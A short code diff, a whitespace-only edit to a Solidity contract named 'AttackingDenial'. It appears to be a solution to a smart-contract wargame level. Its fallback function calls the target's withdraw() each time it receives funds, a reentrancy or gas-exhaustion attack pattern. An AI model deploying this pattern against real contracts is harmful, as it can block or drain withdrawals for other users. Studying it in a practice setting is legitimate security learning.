@@ -8,8 +8,7 @@ contract AttackingDenial {
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
     }
- 
- 
+
     fallback() external payable {
         Denial(contractAddress).withdraw();
     }
